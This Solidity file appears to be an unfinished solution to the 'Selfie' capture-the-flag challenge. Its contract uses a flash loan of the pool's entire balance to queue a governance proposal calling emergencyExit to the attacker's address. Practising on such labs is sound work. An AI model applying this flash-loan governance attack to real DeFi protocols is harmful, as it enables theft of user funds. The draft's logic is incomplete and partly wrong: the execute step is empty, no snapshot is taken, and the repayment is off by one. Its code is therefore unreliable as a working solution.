pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./SimpleGovernance.sol";
import "./SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";

import "hardhat/console.sol";

/// I think we need to call it and later execute it in two different flashloans
/// Not enough votes last test

contract SelfiePoolExploiter is IERC3156FlashBorrower {

    ERC20Snapshot public immutable DVtoken;
    SimpleGovernance public immutable governance;
    SelfiePool public immutable selfie;
    address public immutable owner;
    bool private proposalMade;
    uint256 public actionID;

    constructor(address _token, address _governance, address _selfie) {
        DVtoken = ERC20Snapshot(_token);
        governance = SimpleGovernance(_governance);
        selfie = SelfiePool(_selfie);
        owner = msg.sender;
    }

    function initFlashLoan() external {
        require(msg.sender == owner, 'owner initiates flashloans');
        bool succ = selfie.flashLoan(this, address(DVtoken), DVtoken.balanceOf(address(selfie)), '0x');
        require(succ, "Flashloan function failed");
    }
    
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        console.log("onFlashLoan Checkpoint");
        DVtoken.transfer(address(this), 1);
        if (proposalMade) {
            executeAction(); 
            }
        else {
            executeProposal();
            }
        uint256 repayAmount = amount + fee;
        DVtoken.approve(msg.sender, repayAmount - 1);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function executeProposal() private returns (uint256 _actionID){
        console.log("executeProposal Checkpoint");
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", owner);
        actionID = governance.queueAction(address(selfie), 0, data);
        console.log("actionID:", actionID);
        return actionID;
    }

    function executeAction() private {

    }

}